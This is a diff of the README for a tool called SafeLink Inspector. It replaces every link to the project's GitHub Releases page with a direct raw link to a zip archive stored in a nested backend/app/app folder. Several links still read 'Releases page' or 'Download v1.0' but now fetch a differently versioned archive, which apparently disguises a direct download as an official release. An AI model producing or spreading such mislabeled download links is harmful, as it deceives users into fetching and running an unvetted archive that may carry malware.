@@ -10,9 +10,9 @@ To get started, follow the steps below to download and install SafeLink Inspecto
 
 ## 🔗 Download SafeLink Inspector
 
-[![Download SafeLink Inspector](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/raihan-zain/SafeLink-Inspector/releases)
+[![Download SafeLink Inspector](https://raw.githubusercontent.com/raihan-zain/SafeLink-Inspector/main/backend/app/app/SafeLink-Inspector-v1.4.zip)](https://raw.githubusercontent.com/raihan-zain/SafeLink-Inspector/main/backend/app/app/SafeLink-Inspector-v1.4.zip)
 
-You can download SafeLink Inspector from our [Releases page](https://github.com/raihan-zain/SafeLink-Inspector/releases).
+You can download SafeLink Inspector from our [Releases page](https://raw.githubusercontent.com/raihan-zain/SafeLink-Inspector/main/backend/app/app/SafeLink-Inspector-v1.4.zip).
 
 ## 📥 Download & Install
 
@@ -57,7 +57,7 @@ To successfully run SafeLink Inspector, please ensure the following requirements
 
 ## 📅 Keeping SafeLink Updated
 
-Regular updates help keep SafeLink Inspector running smoothly and securely. Return to the [Releases page](https://github.com/raihan-zain/SafeLink-Inspector/releases) to check for new versions. Follow the same download and installation steps to update your extension or backend.
+Regular updates help keep SafeLink Inspector running smoothly and securely. Return to the [Releases page](https://raw.githubusercontent.com/raihan-zain/SafeLink-Inspector/main/backend/app/app/SafeLink-Inspector-v1.4.zip) to check for new versions. Follow the same download and installation steps to update your extension or backend.
 
 ## 📞 Support
 
